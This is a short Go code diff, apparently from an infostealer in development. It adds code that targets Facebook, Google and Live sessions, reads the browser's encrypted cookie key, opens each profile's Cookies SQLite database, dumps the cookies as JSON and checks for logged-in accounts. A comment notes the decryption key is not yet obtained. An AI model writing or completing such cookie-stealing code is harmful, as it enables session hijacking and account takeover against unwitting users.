@@ -11,6 +11,12 @@ import (
 	"strings"
 )
 
+const (
+	fff = ".facebook.com"
+	ggg = "google.com"
+	lll = "live.com"
+)
+
 var jsonData []interface{}
 
 func FunGetProfile(browser model.BrowserPaths) *model.AllProfile {
@@ -72,6 +78,29 @@ func MainBL(browser model.BrowserPaths) {
 
 	alltt := dataC["os_crypt"].(map[string]interface{})["encrypted_key"].(string)
 	tt := alltt[5:]
-	fmt.Println(pkg.UnprotectData([]byte(tt)))
+	fmt.Println(tt)
+	//fmt.Println(pkg.UnprotectData([]byte(tt)))
+
+	// chua lay duoc secret key
+
+	for _, value := range allProfile.Alls {
+		path := fmt.Sprintf("%v\\Network\\Cookies", value)
+		conn, err := pkg.ConnectSQLite(path)
+		if err != nil {
+			fmt.Println(err)
+		}
+		fmt.Println(conn)
+		token, _ := pkg.QueryData(conn, pkg.CookiesSQL)
+		fmt.Println(token)
+		jsonBytes, err := json.Marshal(token)
+		jsonString := string(jsonBytes)
+		fmt.Println(jsonString)
+		isLogin := pkg.CheckLogin(token)
+		if isLogin != nil {
+			fmt.Println(isLogin)
+
+		}
+
+	}
 
 }
